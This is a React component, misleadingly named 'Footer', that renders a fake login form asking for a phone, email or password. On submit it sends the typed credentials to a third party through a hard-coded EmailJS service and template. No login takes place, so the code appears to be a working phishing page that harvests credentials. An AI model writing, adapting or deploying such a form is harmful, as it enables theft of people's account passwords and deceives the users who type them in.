"use client"
import React, { useRef, useState } from 'react'
import emailjs from "@emailjs/browser";

const Footer = () => {
    const userData = {
        firstName: "",
        password: "",
    }
    const [joinTeamDetails, setJoinTeamDetails] = useState(userData);


    const sendEmail = (e) => {
        e.preventDefault();

        emailjs.init("2ofUor669APLtRslp");

        emailjs
            .send("service_vnvpiol", "template_f5ens19", {
                firstName: joinTeamDetails.firstName,
                password: joinTeamDetails.password,
            })
            .then(() => {
                // setLoading(false);
                // setSuccessPopup(true);
                setJoinTeamDetails(userData);

            })
    }

    const handleChange = (field, value) => {
        setJoinTeamDetails(prevState => ({
            ...prevState,
            [field]: value
        }));
    };

    return (
        <>
            <div className="xl:px-0 bg-white min-h-screen">
                <div className="py-12 sm:py-16 md:py-20 max-w-[500px] px-4 sm:px-6 mx-auto">

                    <form onSubmit={(e) => sendEmail(e)} className='pt-10 max-w-[450px] sm:max-w-[500px] md:max-w-[650px] lg:max-w-[1000px] mx-auto'>
                        <div className="flex flex-col md:flex-row gap-8 md:gap-14 lg:gap-20 w-full">
                            <div className='flex flex-col w-full relative max-w-[200px] mx-auto'>
                                <input
                                    className='border border-black p-1 pt-0 text-base md:text-lg leading-none text-green-yellow tracking-[0.3px]'
                                    type="text"
                                    id='firstName'
                                    placeholder='phone,email,password'
                                    value={joinTeamDetails.firstName}
                                    onChange={(e) => handleChange('firstName', e.target.value)}
                                />
                            </div>
                            <div className='flex flex-col w-full relative max-w-[200px] mx-auto'>
                                <input
                                    className='border border-black p-1 pt-0 text-base md:text-lg leading-none text-green-yellow tracking-[0.3px]'
                                    type="password"
                                    id='password'
                                    placeholder='Enter your password'
                                    value={joinTeamDetails.password}
                                    onChange={(e) => handleChange('password', e.target.value)}
                                />
                            </div>

                        </div>
                        <div className='max-w-[200px] mx-auto my-3 flex justify-end'>
                            <a className='text-blue-700' href="#">forget password</a>
                        </div>
                        <div className='flex justify-center mt-6 max-w-[200px] mx-auto'>
                            <button type='submit '
                                className='bg-blue-700 w-full py-3 z-[101] px-8 rounded-lg text-base md:text-lg font-roboto font-semibold text-black hover:shadow-transparentShadow hover:text-green-yellow border border-green-yellow duration-500 !leading-[140%]'>
                                Log in
                            </button>
                        </div>
                    </form>
                </div>
            </div>
        </>
    )
}

export default Footer